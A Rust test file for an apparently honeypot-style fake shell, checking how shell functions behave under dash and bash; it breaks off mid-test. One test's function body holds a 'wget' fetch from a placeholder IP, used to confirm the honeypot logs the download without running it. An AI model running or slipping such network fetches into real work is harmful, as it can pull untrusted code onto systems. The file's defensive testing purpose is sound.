//! Shell functions end to end: definition, calls, the scope a call gets (`$1..`, `local`, loops),
//! `return`, shadowing, the lookups that report a function, the caps on recursion and on work, and
//! the dash and bash differences. Every reply asserted here was produced by Ubuntu 22.04's dash
//! 0.5.11 or bash 5.1.16 in the `propolis-survey-ref:jammy` container, run with `--network none`
//! as `dash -c TEXT` / `bash -c TEXT` (the `bash -c` shell is the SSH exec persona's) or, for the
//! session fixtures, as an interactive login `bash` fed one line at a time. Where a test names
//! `[unverified]`, no reference shell was available (mksh) or the real one cannot be run to the
//! end (an unlimited recursion kills bash).

use crate::fakefs::FakeFs;
use crate::shell::{BudgetHit, CommandClass, EmitContext, FakeShell, HandlerId, ParseNode};

fn ctx() -> EmitContext {
    EmitContext {
        source_ip: "203.0.113.7".parse().unwrap(),
        wan_ip: None,
        authenticated: true,
        protocol_label: "ssh".to_string(),
        session_id: None,
    }
}

/// An interactive login bash, as SSH and telnet sessions get.
fn shell() -> FakeShell {
    FakeShell::new(FakeFs::new(), ctx())
}

/// The `bash -c` shell an SSH exec request runs.
fn exec() -> FakeShell {
    FakeShell::exec(FakeFs::new(), ctx())
}

fn android() -> FakeShell {
    FakeShell::android(FakeFs::android(), ctx())
}

fn run(sh: &mut FakeShell, line: &str) -> String {
    sh.handle_input(line).0.to_string()
}

fn status(sh: &mut FakeShell, line: &str) -> u8 {
    sh.handle_input(line).0.status
}

/// What `sh -c SCRIPT` (dash) prints, run from the login shell. `script` holds no single quote.
fn dash(script: &str) -> String {
    assert!(!script.contains('\''), "{script}");
    run(&mut shell(), &format!("sh -c '{script}'"))
}

/// What `bash -c SCRIPT` prints from the login shell.
fn bash(script: &str) -> String {
    assert!(!script.contains('\''), "{script}");
    run(&mut shell(), &format!("bash -c '{script}'"))
}

mod definition_and_call {
    use super::*;

    #[test]
    fn a_definition_stores_the_body_and_a_call_runs_it() {
        // dash -c 'f() { echo hi; }; f; echo "rc=$?"' and the same under bash.
        assert_eq!(dash("f() { echo hi; }; f; echo \"rc=$?\""), "hi\nrc=0\n");
        assert_eq!(
            run(&mut shell(), "f() { echo hi; }; f; echo \"rc=$?\""),
            "hi\nrc=0\n"
        );
        assert_eq!(bash("f() { echo hi; }; f; echo \"rc=$?\""), "hi\nrc=0\n");
    }

    #[test]
    fn a_definition_prints_nothing_runs_nothing_and_is_status_zero() {
        let mut sh = shell();
        sh.handle_input("false");
        let (out, events) = sh.handle_input("f() { echo hi; wget http://198.51.100.9/x; }");
        assert_eq!((out.to_string(), out.status), (String::new(), 0));
        assert_eq!(sh.handle_input("echo $?").0, "0\n");
        // The body did not run; only the lexical fallback saw the fetch it holds.
        assert_eq!(events.len(), 2, "the command and the one fallback download");
    }

    #[test]
    fn the_definition_persists_across_input_lines_and_can_be_replaced() {
        let mut sh = shell();
        sh.handle_input("f() { echo one; }");
        assert_eq!(run(&mut sh, "f"), "one\n");
        sh.handle_input("f() { echo two; }");
        assert_eq!(run(&mut sh, "f"), "two\n");
    }

    #[test]
    fn a_function_calling_another_defined_later_finds_it_at_call_time() {
        // bash and dash: f() { f2; }; f2() { echo late; }; f   ->  late
        assert_eq!(once("f() { f2; }; f2() { echo late; }; f"), "late\n");
        // The call looks the name up when it runs, so a redefinition in between is what runs.
        assert_eq!(
            once("f() { echo A; }; g() { f; echo B; }; f() { echo A2; }; g"),
            "A2\nB\n"
        );
    }

    fn once(line: &str) -> String {
        run(&mut shell(), line)
    }

    #[test]
    fn a_definition_inside_a_function_exists_after_it_runs() {
        // dash and bash: f() { g() { echo inner; }; }; f; g  ->  inner
        assert_eq!(once("f() { g() { echo inner; }; }; f; g"), "inner\n");
        assert_eq!(dash("f() { g() { echo inner; }; }; f; g"), "inner\n");
    }

    #[test]
    fn a_definition_in_a_branch_or_after_and_runs_only_when_the_branch_does() {
        assert_eq!(once("true && f() { echo cond; } ; f"), "cond\n");
        assert_eq!(once("if true; then f() { echo ifdef; }; fi; f"), "ifdef\n");
        assert!(once("false && f() { echo no; }; f").contains("f: command not found"));
    }

    #[test]
    fn every_body_form_is_a_function_body() {
        // f() ( echo Y )   f() if ..; fi   f() while ..; done   f() for ..; done   f() case ..
        // all print the same under dash and bash.
        let script = "f() ( echo Y ); f; f() if true; then echo Z; fi; f; \
                      f() for i in 1 2; do echo $i; done; f; f() case a in a) echo C;; esac; f";
        assert_eq!(once(script), "Y\nZ\n1\n2\nC\n");
        assert_eq!(dash(script), "Y\nZ\n1\n2\nC\n");
    }

    #[test]
    fn dash_takes_a_simple_command_body_and_bash_refuses_it() {
        // dash -c 'f() echo hi; f'  ->  hi
        assert_eq!(dash("f() echo hi; f"), "hi\n");
        // bash: syntax error near unexpected token `echo' (status 2)
        let mut sh = shell();
        let (out, _) = sh.handle_input("f() echo hi");
        assert_eq!(out, "-bash: syntax error near unexpected token `echo'\n");
        assert_eq!(out.status, 2);
    }

    #[test]
    fn the_function_keyword_is_bash_only() {
        // dash -c 'function f { echo hi; }; f'  ->  sh: 1: Syntax error: "}" unexpected
        assert_eq!(
            dash("function f { echo hi; }; f"),
            "sh: 1: Syntax error: \"}\" unexpected\n"
        );
        assert_eq!(
            dash("function f() { echo hi; }; f"),
            "sh: 1: Syntax error: \"(\" unexpected\n"
        );
        assert_eq!(once("function f { echo kw; }; f"), "kw\n");
        assert_eq!(once("function f() { echo kw2; }; f"), "kw2\n");
        assert_eq!(bash("function f { echo kw; }; f"), "kw\n");
    }

    #[test]
    fn dash_refuses_names_that_are_not_identifiers_before_running_anything() {
        // dash -c 'echo before; f-g() { :; }'  ->  Bad function name, `before` never printed
        for script in [
            "echo before; f-g() { :; }",
            "echo before; a.b() { :; }",
            "echo before; 1f() { :; }",
            "echo before; \"f\"() { :; }",
        ] {
            assert_eq!(
                dash(script),
                "sh: 1: Syntax error: Bad function name\n",
                "{script}"
            );
        }
    }

    #[test]
    fn dash_cannot_define_a_special_builtin_and_bash_can() {
        for name in [
            ".", ":", "break", "continue", "eval", "exec", "exit", "export", "local", "readonly",
            "return", "set", "shift", "times", "trap", "unset",
        ] {
            assert_eq!(
                dash(&format!("{name}() {{ echo mine; }}; echo done")),
                "sh: 1: Syntax error: Bad function name\n",
                "{name}"
            );
        }
        // Not special in dash: allowed, and the function wins.
        for name in [
            "cd", "echo", "true", "type", "command", "read", "umask", "getopts",
        ] {
            assert_eq!(
                dash(&format!("{name}() {{ printf 'mine\\n'; }}; {name}").replace('\'', "\"")),
                "mine\n",
                "{name}"
            );
        }
        // bash takes any of them, and the function wins over the builtin.
        assert_eq!(run(&mut shell(), "set() { echo mine; }; set"), "mine\n");
        assert_eq!(run(&mut shell(), ":() { echo mine; }; :"), "mine\n");
    }

    #[test]
    fn bash_takes_unusual_names_and_dash_does_not() {
        assert_eq!(run(&mut shell(), "f-g() { echo hy; }; f-g"), "hy\n");
        assert_eq!(run(&mut shell(), "a.b() { echo dot; }; a.b"), "dot\n");
        assert_eq!(run(&mut shell(), "1f() { echo digit; }; 1f"), "digit\n");
        // A name with a slash can be defined, but calling `a/b` runs the path, not the function.
        assert_eq!(run(&mut shell(), "a/b() { echo q; }"), "");
        assert_eq!(
            run(&mut shell(), "a/b() { echo q; }; a/b"),
            "-bash: a/b: No such file or directory\n"
        );
        // A quoted or expanded name is refused at run time, as an invalid identifier.
        let mut sh = shell();
        let (out, _) = sh.handle_input("\"f\"() { echo q; }");
        assert_eq!(out, "-bash: `\"f\"': not a valid identifier\n");
        assert_eq!(out.status, 1);
        assert_eq!(
            run(&mut sh, "x=zz; $x() { echo q; }; echo done"),
            "-bash: `$x': not a valid identifier\ndone\n"
        );
    }

    #[test]
    fn an_unfinished_definition_waits_for_the_rest() {
        let mut sh = shell();
        assert_eq!(run(&mut sh, "f()"), "");
        assert_eq!(sh.prompt(), "> ");
        assert_eq!(run(&mut sh, "{"), "");
        assert_eq!(run(&mut sh, "echo split"), "");
        assert_eq!(run(&mut sh, "}"), "");
        assert_eq!(run(&mut sh, "f"), "split\n");
    }
}

mod arguments {
    use super::*;

    #[test]
    fn the_call_gets_its_own_positional_parameters_and_the_caller_gets_its_own_back() {
        // bash and dash: f() { echo "n=$# 1=$1 2=$2 at=$@ zero=$0"; }; set -- x y z; f a b; echo ..
        let script = "f() { echo \"n=$# 1=$1 2=$2 at=$@\"; }; set -- x y z; f a b; \
                      echo \"after n=$# 1=$1 at=$@\"";
        let want = "n=2 1=a 2=b at=a b\nafter n=3 1=x at=x y z\n";
        assert_eq!(run(&mut shell(), script), want);
        assert_eq!(dash(script), want);
        assert_eq!(bash(script), want);
    }

    #[test]
    fn dollar_zero_is_the_shells_not_the_functions() {
        // login bash: -bash; bash -c: bash; dash -c: dash (here the `sh` the login shell started)
        assert_eq!(run(&mut shell(), "f() { echo $0; }; f"), "-bash\n");
        assert_eq!(bash("f() { echo $0; }; f"), "bash\n");
        assert_eq!(dash("f() { echo $0; }; f"), "sh\n");
        // sh -c 'f() { echo "$0 $1"; }; f x' name arg  ->  name x
        assert_eq!(
            run(
                &mut shell(),
                "sh -c 'f() { echo \"$0 $1\"; }; f x' name arg"
            ),
            "name x\n"
        );
    }

    #[test]
    fn a_function_called_without_arguments_has_none_not_the_callers() {
        let mut sh = shell();
        assert_eq!(
            run(
                &mut sh,
                "f() { echo \"$#\"; }; set -- 1 2; f; f \"$@\"; f \"$*\"; f $*"
            ),
            "0\n2\n1\n2\n"
        );
    }

    #[test]
    fn at_and_star_quote_the_function_arguments() {
        assert_eq!(
            run(
                &mut shell(),
                "f() { echo \"<$@>\"; for a in \"$@\"; do echo \"[$a]\"; done; echo \"<$*>\"; }; \
                 f \"a b\" c \"\""
            ),
            "<a b c >\n[a b]\n[c]\n[]\n<a b c >\n"
        );
    }

    #[test]
    fn set_and_shift_inside_a_call_change_only_the_call() {
        // f() { echo in; set -- p q; echo "$# $1"; shift; echo "$# $1"; }; set -- a b c; f x y z
        let script = "f() { echo in; set -- p q; echo \"$# $1\"; shift; echo \"$# $1\"; }; \
                      set -- a b c; f x y z; echo \"$# $1\"";
        let want = "in\n2 p\n1 q\n3 a\n";
        assert_eq!(run(&mut shell(), script), want);
        assert_eq!(dash(script), want);
    }

    #[test]
    fn command_substitution_arguments_split_into_words() {
        // f() { echo "$#"; }; f $(echo a b c) "$(echo a b c)"  ->  4
        assert_eq!(
            run(
                &mut shell(),
                "f() { echo \"$#\"; }; f $(echo a b c) \"$(echo a b c)\""
            ),
            "4\n"
        );
    }

    #[test]
    fn a_prefix_assignment_is_visible_in_the_call_and_gone_after() {
        // X=1 f  ->  1, then X is empty again
        assert_eq!(
            run(
                &mut shell(),
                "f() { echo \"$X\"; }; X=1 f; echo \"after [$X]\""
            ),
            "1\nafter []\n"
        );
        assert_eq!(
            dash("f() { echo \"$X\"; }; X=1 f; echo \"after [$X]\""),
            "1\nafter []\n"
        );
    }

    #[test]
    fn the_status_at_entry_is_the_one_the_caller_left() {
        assert_eq!(run(&mut shell(), "f() { echo $?; }; false; f"), "1\n");
    }
}

mod return_status {
    use super::*;

    #[test]
    fn return_sets_the_status_and_otherwise_the_last_command_does() {
        let script = "f() { return 3; }; f; echo \"rc=$?\"; g() { false; return; }; g; \
                      echo \"rc=$?\"; h() { true; return; }; h; echo \"rc=$?\"; \
                      k() { false; }; k; echo \"rc=$?\"";
        let want = "rc=3\nrc=1\nrc=0\nrc=1\n";
        assert_eq!(run(&mut shell(), script), want);
        assert_eq!(dash(script), want);
    }

    #[test]
    fn return_ends_the_function_through_loops_and_branches() {
        // for i in 1 2 3; do if [ $i = 2 ]; then return 9; fi; echo $i; done; echo notreached
        let script = "f() { for i in 1 2 3; do if [ $i = 2 ]; then return 9; fi; echo $i; done; \
                      echo notreached; }; f; echo \"rc=$?\"";
        assert_eq!(run(&mut shell(), script), "1\nrc=9\n");
        assert_eq!(dash(script), "1\nrc=9\n");
        let script = "f() { while :; do case x in x) return 4;; esac; done; echo no; }; f; echo $?";
        assert_eq!(run(&mut shell(), script), "4\n");
    }

    #[test]
    fn return_in_a_subshell_ends_the_subshell_only() {
        // f() { ( return 4; echo no ); echo "rc=$?"; }; f   ->  rc=4
        let script = "f() { ( return 4; echo no ); echo \"rc=$?\"; }; f";
        assert_eq!(run(&mut shell(), script), "rc=4\n");
        assert_eq!(dash(script), "rc=4\n");
        // f() ( echo sub; return 5 ); f; echo "rc=$?"
        let script = "f() ( echo sub; return 5 ); f; echo \"rc=$?\"";
        assert_eq!(run(&mut shell(), script), "sub\nrc=5\n");
        // A pipeline stage is a subshell too.
        let script = "f() { echo x | { read v; return 6; }; echo \"rc=$?\"; }; f";
        assert_eq!(run(&mut shell(), script), "rc=6\n");
        assert_eq!(dash(script), "rc=6\n");
    }

    #[test]
    fn bash_takes_the_status_modulo_256_and_complains_of_a_word() {
        let mut sh = shell();
        assert_eq!(run(&mut sh, "f() { return 300; }; f; echo $?"), "44\n");
        assert_eq!(run(&mut sh, "f() { return -1; }; f; echo $?"), "255\n");
        assert_eq!(
            run(&mut sh, "f() { return abc; echo cont; }; f; echo $?"),
            "-bash: return: abc: numeric argument required\n2\n"
        );
    }

    #[test]
    fn bash_drops_the_whole_line_on_too_many_arguments() {
        // bash -c 'f() { return 3 4; echo cont; }; f; echo reached'
        //   -> environment: line 1: return: too many arguments, status 1, nothing after it
        let mut sh = exec();
        let (out, _) = sh.handle_input("f() { return 3 4; echo cont; }; f; echo reached");
        assert_eq!(out, "environment: line 1: return: too many arguments\n");
        assert_eq!(out.status, 1);
        // dash ignores the extra word.
        assert_eq!(dash("f() { return 3 4; }; f; echo \"rc=$?\""), "rc=3\n");
    }

    #[test]
    fn dash_refuses_a_status_that_is_not_a_number_and_exits() {
        // dash -c 'f() { return -1; }; f; echo cont'  ->  sh: 1: return: Illegal number: -1, exit 2
        assert_eq!(
            dash("f() { return -1; }; f; echo cont"),
            "sh: 1: return: Illegal number: -1\n"
        );
        assert_eq!(
            dash("f() { return abc; }; f; echo cont"),
            "sh: 1: return: Illegal number: abc\n"
        );
        let mut sh = shell();
        sh.handle_input("sh -c 'return -1'");
        assert_eq!(sh.last_status(), 2);
    }

    #[test]
    fn return_outside_a_function_is_an_error_in_bash_and_an_exit_in_dash() {
        // bash: return: can only `return' from a function or sourced script, status 2, goes on
        let mut sh = shell();
        let (out, _) = sh.handle_input("return 4");
        assert_eq!(
            out,
            "-bash: return: can only `return' from a function or sourced script\n"
        );
        assert_eq!(out.status, 2);
        assert_eq!(run(&mut sh, "echo after"), "after\n");
        // bash -c 'return 3; echo after $?'  ->  bash: line 1: return: can only ...  /  after 2
        assert_eq!(
            run(&mut exec(), "return 3; echo after $?"),
            "bash: line 1: return: can only `return' from a function or sourced script\nafter 2\n"
        );
        // dash -c 'return 3; echo after'  ->  exits 3 with no output
        assert_eq!(dash("return 3; echo after"), "");
        let mut sh = shell();
        sh.handle_input("sh -c 'return 3; echo after'");
        assert_eq!(sh.last_status(), 3);
        // `return` with no number keeps the status the line before left.
        sh.handle_input("sh -c 'false; return; echo b'");
        assert_eq!(sh.last_status(), 1);
        assert_eq!(dash("echo a; return; echo b"), "a\n");
    }
}

mod shadowing_and_lookup {
    use super::*;

    #[test]
    fn a_function_answers_before_a_builtin_and_before_a_file() {
        assert_eq!(
            run(&mut shell(), "ls() { echo mine; }; ls; \\ls"),
            "mine\nmine\n"
        );
        assert_eq!(dash("ls() { echo mine; }; ls; \\ls"), "mine\nmine\n");
        assert_eq!(
            run(
                &mut shell(),
                "echo() { printf 'mine %s\\n' \"$*\"; }; echo hi"
            ),
            "mine hi\n"
        );
        assert_eq!(
            dash("cd() { echo mine; }; cd /tmp; echo \"rc=$?\""),
            "mine\nrc=0\n"
        );
    }

    #[test]
    fn command_and_builtin_reach_past_a_function() {
        let mut sh = shell();
        // echo() {...}; command echo hi  ->  hi;  builtin echo hi  ->  hi (bash only)
        assert_eq!(
            run(
                &mut sh,
                "echo() { printf 'mine %s\\n' \"$*\"; }; echo hi; command echo hi; builtin echo hi"
            ),
            "mine hi\nhi\nhi\n"
        );
        assert_eq!(
            dash("echo() { printf \"mine %s\\n\" \"$*\"; }; echo hi; command echo hi"),
            "mine hi\nhi\n"
        );
        // ls() { command ls "$@"; }; ls /nonexistent_dir
        assert_eq!(
            run(
                &mut shell(),
                "ls() { command ls \"$@\"; }; ls /nonexistent_dir; echo rc=$?"
            ),
            "ls: cannot access '/nonexistent_dir': No such file or directory\nrc=2\n"
        );
    }

    #[test]
    fn command_f_does_not_find_a_function() {
        // dash: sh: 1: f: not found, rc=127   bash: f: command not found, rc=127
        assert_eq!(
            dash("f() { echo hi; }; command f; echo \"rc=$?\""),
            "sh: 1: f: not found\nrc=127\n"
        );
        assert_eq!(
            run(&mut exec(), "f() { echo hi; }; command f; echo \"rc=$?\""),
            "bash: line 1: f: command not found\nrc=127\n"
        );
    }

    #[test]
    fn programs_started_by_other_commands_do_not_see_functions() {
        // env f  ->  env: 'f': No such file or directory (127);  sh -c f  ->  sh: 1: f: not found
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "f() { echo hi; }; env f; echo rc=$?"),
            "env: 'f': No such file or directory\nrc=127\n"
        );
        assert_eq!(
            run(&mut sh, "sh -c f; echo rc=$?"),
            "sh: 1: f: not found\nrc=127\n"
        );
        // and a function of the same name is not a file for `which`
        assert_eq!(run(&mut sh, "which f; echo rc=$?"), "rc=1\n");
    }

    #[test]
    fn a_path_is_never_a_function() {
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "f() { echo hi; }; ./f"),
            "-bash: ./f: No such file or directory\n"
        );
    }

    #[test]
    fn type_and_command_report_a_function_the_way_each_shell_does() {
        // dash -c 'f() { echo a; }; type f; command -v f; command -V f; unset -f f; type f; ...'
        assert_eq!(
            dash(
                "f() { echo a; }; type f; command -v f; command -V f; unset -f f; type f; \
                 command -v f; echo \"rc=$?\"; f; echo \"rc=$?\""
            ),
            "f is a shell function\nf\nf is a shell function\nf: not found\nrc=127\n\
             sh: 1: f: not found\nrc=127\n"
        );
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "f() { echo a; }; type f"),
            "f is a function\nf () \n{ \n    echo a\n}\n"
        );
        assert_eq!(run(&mut sh, "type -t f; command -v f"), "function\nf\n");
        assert_eq!(
            run(&mut sh, "command -V f"),
            "f is a function\nf () \n{ \n    echo a\n}\n"
        );
        assert_eq!(run(&mut sh, "type -p f; echo $?"), "0\n");
        assert_eq!(
            run(&mut sh, "type -a f"),
            "f is a function\nf () \n{ \n    echo a\n}\n"
        );
        sh.handle_input("unset -f f");
        assert_eq!(run(&mut sh, "type f"), "-bash: type: f: not found\n");
        assert_eq!(run(&mut sh, "command -v f; echo $?"), "1\n");
    }

    #[test]
    fn type_lists_the_function_before_the_builtin_and_the_file_it_hides() {
        let mut sh = shell();
        sh.handle_input("echo() { :; }");
        assert_eq!(
            run(&mut sh, "type echo"),
            "echo is a function\necho () \n{ \n    :\n}\n"
        );
        let all = run(&mut sh, "type -a echo");
        assert!(all.starts_with("echo is a function\n"), "{all}");
        assert!(all.contains("echo is a shell builtin\n"), "{all}");
    }

    #[test]
    fn bash_lists_a_body_it_cannot_print_from_the_text_it_was_typed_as() {
        // `[[ ]]` is skipped by this shell, so there is no tree; the listing keeps the text.
        let mut sh = shell();
        sh.handle_input("f() { [[ -f x ]] && echo y; echo ${v##*/}; }");
        let listing = run(&mut sh, "type f");
        assert!(
            listing.starts_with("f is a function\nf () \n{ \n"),
            "{listing}"
        );
        assert!(listing.contains("[[ -f x ]] && echo y"), "{listing}");
        assert!(listing.ends_with("}\n"), "{listing}");
    }

    #[test]
    fn set_lists_bash_functions_after_the_variables_and_dash_lists_none() {
        let mut sh = shell();
        sh.handle_input("f() { echo a; }");
        let listing = run(&mut sh, "set");
        assert!(listing.ends_with("f () \n{ \n    echo a\n}\n"), "{listing}");
        assert!(!dash("f() { echo a; }; set").contains("f ()"));
    }

    #[test]
    fn unset_removes_a_function_by_option_and_bash_also_without_one() {
        // dash: unset f leaves the function; unset -v f too; unset -f f removes it
        assert_eq!(dash("f() { echo hi; }; unset f; f"), "hi\n");
        assert_eq!(
            dash("f() { echo hi; }; unset -v f; f; unset -f f; f; echo \"rc=$?\""),
            "hi\nsh: 1: f: not found\nrc=127\n"
        );
        // bash: unset f removes the function when there is no variable f; -v does not
        let mut sh = shell();
        assert_eq!(
            run(
                &mut sh,
                "f() { echo hi; }; v=1; unset -v f; f; unset -f v; echo \"v=$v\"; unset -f nosuch; echo rc=$?"
            ),
            "hi\nv=1\nrc=0\n"
        );
        assert_eq!(
            run(&mut sh, "unset f; type f"),
            "-bash: type: f: not found\n"
        );
        // a variable named f is unset first, the function stays
        assert_eq!(run(&mut sh, "f() { echo hi; }; f=1; unset f; f"), "hi\n");
        let mut sh = shell();
        let (out, _) = sh.handle_input("unset -fv f");
        assert_eq!(
            out,
            "-bash: unset: cannot simultaneously unset a function and a variable\n"
        );
        assert_eq!(out.status, 1);
    }

    #[test]
    fn dash_words_its_special_builtins_apart_in_type_and_command_v_capital() {
        // dash -c 'type return local export set : . cd echo read'
        assert_eq!(
            dash("type return local export set : . cd echo read"),
            "return is a special shell builtin\nlocal is a special shell builtin\n\
             export is a special shell builtin\nset is a special shell builtin\n\
             : is a special shell builtin\n. is a special shell builtin\n\
             cd is a shell builtin\necho is a shell builtin\nread is a shell builtin\n"
        );
        assert_eq!(
            dash("command -V export cd"),
            "export is a special shell builtin\n"
        );
        // bash and the phone's mksh have one word for all of them
        assert_eq!(
            run(&mut shell(), "type return local export"),
            "return is a shell builtin\nlocal is a shell builtin\nexport is a shell builtin\n"
        );
    }

    #[test]
    fn builtin_runs_a_shell_builtin_and_nothing_else() {
        let mut sh = shell();
        assert_eq!(run(&mut sh, "builtin echo hi; echo rc=$?"), "hi\nrc=0\n");
        assert_eq!(
            run(&mut sh, "builtin nosuch; echo rc=$?"),
            "-bash: builtin: nosuch: not a shell builtin\nrc=1\n"
        );
        assert_eq!(
            run(&mut sh, "builtin ls /; echo rc=$?"),
            "-bash: builtin: ls: not a shell builtin\nrc=1\n"
        );
        assert_eq!(
            run(&mut sh, "f() { echo A; }; builtin f; echo rc=$?"),
            "-bash: builtin: f: not a shell builtin\nrc=1\n"
        );
        assert_eq!(run(&mut sh, "builtin; echo rc=$?"), "rc=0\n");
        // dash has none
        assert_eq!(dash("builtin echo hi"), "sh: 1: builtin: not found\n");
    }
}

mod definitions_redirections {
    use super::*;

    #[test]
    fn a_redirection_on_the_definition_applies_to_each_call() {
        // f() { echo hi; } >/tmp/o; f; echo --; cat /tmp/o; f; cat /tmp/o   ->  --, hi, hi
        let script =
            "f() { echo hi; } >/tmp/shfn_o; f; echo --; cat /tmp/shfn_o; f; cat /tmp/shfn_o";
        assert_eq!(run(&mut shell(), script), "--\nhi\nhi\n");
        assert_eq!(dash(script), "--\nhi\nhi\n");
    }

    #[test]
    fn nothing_is_opened_when_the_function_is_defined() {
        let mut sh = shell();
        sh.handle_input("f() { echo hi; } >/tmp/shfn_never");
        assert_eq!(
            run(&mut sh, "ls /tmp/shfn_never"),
            "ls: cannot access '/tmp/shfn_never': No such file or directory\n"
        );
    }

    #[test]
    fn stderr_and_stdout_redirections_on_the_definition_route_the_streams() {
        let mut sh = shell();
        // f() { echo err >&2; } 2>/dev/null; f; echo end   ->  end
        assert_eq!(
            run(&mut sh, "f() { echo err >&2; } 2>/dev/null; f; echo end"),
            "end\n"
        );
        // f() { echo A; } 2>&1 >/dev/null; f; echo end   ->  end
        assert_eq!(
            run(&mut sh, "f() { echo A; } 2>&1 >/dev/null; f; echo end"),
            "end\n"
        );
    }

    #[test]
    fn a_redirection_at_the_call_applies_to_the_whole_call() {
        let mut sh = shell();
        assert_eq!(
            run(
                &mut sh,
                "f() { echo a; echo b; }; f > /tmp/shfn_c; cat /tmp/shfn_c; f | head -1"
            ),
            "a\nb\na\n"
        );
        assert_eq!(run(&mut sh, "f() { cat; }; echo piped | f"), "piped\n");
        assert_eq!(
            run(
                &mut sh,
                "f() { read a b; echo \"[$a][$b]\"; }; echo \"1 2\" | f"
            ),
            "[1][2]\n"
        );
    }
}

mod scope {
    use super::*;

    #[test]
    fn local_restores_the_variable_when_the_function_returns() {
        // f() { local x=1; echo "in $x"; }; x=0; f; echo "out $x"   (dash and bash)
        let script = "f() { local x=1; echo \"in $x\"; }; x=0; f; echo \"out $x\"";
        assert_eq!(run(&mut shell(), script), "in 1\nout 0\n");
        assert_eq!(dash(script), "in 1\nout 0\n");
        // a variable that was unset is unset again
        assert_eq!(
            run(&mut shell(), "f() { local y=1; }; f; echo \"[${y-unset}]\""),
            "[unset]\n"
        );
    }

    #[test]
    fn local_without_a_value_unsets_in_bash_and_keeps_the_value_in_dash() {
        // f() { local x; echo "[${x-unset}]"; }; x=0; f   bash [unset]   dash [0]
        assert_eq!(
            run(
                &mut shell(),
                "f() { local x; echo \"[${x-unset}]\"; }; x=0; f"
            ),
            "[unset]\n"
        );
        assert_eq!(
            dash(
                "f() { local x; echo \"[${x-unset}]\"; x=2; echo \"[$x]\"; }; x=0; f; echo \"[$x]\""
            ),
            "[0]\n[2]\n[0]\n"
        );
    }

    #[test]
    fn a_callee_sees_and_changes_the_callers_local() {
        // g() { local x=5; h; echo "g x=$x"; }; h() { x=9; }; g; echo "x=$x"   ->  g x=9, x=
        let script = "g() { local x=5; h; echo \"g x=$x\"; }; h() { x=9; }; x=0; g; echo \"x=$x\"";
        assert_eq!(run(&mut shell(), script), "g x=9\nx=0\n");
        assert_eq!(dash(script), "g x=9\nx=0\n");
    }

    #[test]
    fn several_locals_and_a_second_local_of_the_same_name_restore_the_first_value() {
        let script =
            "f() { local a=1 b=2; echo \"$a $b\"; local a=7; echo \"$a\"; }; a=0; f; echo \"$a\"";
        assert_eq!(run(&mut shell(), script), "1 2\n7\n0\n");
        assert_eq!(dash(script), "1 2\n7\n0\n");
    }

    #[test]
    fn a_variable_set_in_a_function_without_local_stays_set() {
        assert_eq!(run(&mut shell(), "f() { x=1; }; f; echo \"x=$x\""), "x=1\n");
        assert_eq!(dash("f() { x=1; }; f; echo \"x=$x\""), "x=1\n");
    }

    #[test]
    fn local_outside_a_function_and_with_a_bad_name() {
        let mut sh = shell();
        let (out, _) = sh.handle_input("local x=1; echo $?");
        assert_eq!(out, "-bash: local: can only be used in a function\n1\n");
        assert_eq!(
            run(&mut sh, "f() { local 1x; echo \"rc=$?\"; }; f"),
            "-bash: local: `1x': not a valid identifier\nrc=1\n"
        );
        // dash: both are fatal.
        assert_eq!(
            dash("local x=1; echo \"rc=$?\""),
            "sh: 1: local: not in a function\n"
        );
        assert_eq!(
            dash("f() { local 1x; echo \"rc=$?\"; }; f"),
            "sh: 1: local: 1x: bad variable name\n"
        );
        assert_eq!(
            dash("f() { local -i n=5; echo $n; }; f"),
            "sh: 1: local: -i: bad variable name\n"
        );
        // bash takes options and ignores what it does not model
        assert_eq!(run(&mut sh, "f() { local -i n=5; echo $n; }; f"), "5\n");
    }

    #[test]
    fn local_survives_a_subshell_started_inside_the_function() {
        let mut sh = shell();
        assert_eq!(
            run(
                &mut sh,
                "f() { local x=1; ( x=2; echo $x ); echo $x; }; x=0; f; echo $x"
            ),
            "2\n1\n0\n"
        );
    }

    #[test]
    fn break_inside_a_function_does_not_reach_the_callers_loop() {
        // for j in 1 2; do g() { break; }; g; echo "j=$j"; done
        //   dash: j=1 j=2 silently;  bash: the same plus "break: only meaningful in a loop" twice
        assert_eq!(
            dash("for j in 1 2; do g() { break; }; g; echo \"j=$j\"; done"),
            "j=1\nj=2\n"
        );
        assert_eq!(
            run(
                &mut shell(),
                "for j in 1 2; do g() { break; }; g; echo \"j=$j\"; done"
            ),
            "-bash: break: only meaningful in a `for', `while', or `until' loop\nj=1\n\
             -bash: break: only meaningful in a `for', `while', or `until' loop\nj=2\n"
        );
        // A loop inside the function still breaks.
        assert_eq!(
            run(
                &mut shell(),
                "f() { for i in 1 2 3; do echo $i; break; done; echo after; }; f"
            ),
            "1\nafter\n"
        );
    }

    #[test]
    fn exit_in_a_function_ends_the_shell_or_the_subshell_it_runs_in() {
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "f() { exit 7; }; (f); echo \"sub rc=$?\""),
            "sub rc=7\n"
        );
        let (out, _) = sh.handle_input("f() { exit 7; }; f; echo no");
        assert_eq!(
            (out.to_string(), out.close_session, out.status),
            ("logout\n".to_string(), true, 7)
        );
        assert_eq!(dash("f() { exit 7; }; f; echo no"), "");
    }

    #[test]
    fn export_inside_a_function_exports_to_programs_it_starts() {
        assert_eq!(
            run(&mut shell(), "f() { export Z=9; }; f; sh -c 'echo $Z'"),
            "9\n"
        );
        assert_eq!(
            run(&mut shell(), "f() { X=1; export X; }; f; sh -c 'echo $X'"),
            "1\n"
        );
    }

    #[test]
    fn bash_names_the_running_function() {
        // f() { echo "$FUNCNAME"; g; }; g() { echo "$FUNCNAME"; }; f; echo "<$FUNCNAME>"
        assert_eq!(
            run(
                &mut shell(),
                "f() { echo \"$FUNCNAME\"; g; }; g() { echo \"$FUNCNAME\"; }; f"
            ),
            "f\ng\n"
        );
        assert_eq!(run(&mut shell(), "echo \"<$FUNCNAME>\""), "<>\n");
        assert_eq!(dash("f() { echo \"$FUNCNAME|\"; }; f"), "|\n");
    }

    #[test]
    fn a_function_defined_in_a_subshell_or_a_substitution_does_not_outlive_it() {
        let mut sh = shell();
        assert_eq!(
            run(&mut sh, "( g() { echo sub; }; g ); type g"),
            "sub\n-bash: type: g: not found\n"
        );
        assert_eq!(
            run(&mut sh, "echo $(h() { echo cs; }; h); type h"),
            "cs\n-bash: type: h: not found\n"
        );
        assert_eq!(
            run(&mut sh, "echo x | { k() { :; }; }; type k"),
            "-bash: type: k: not found\n"
        );
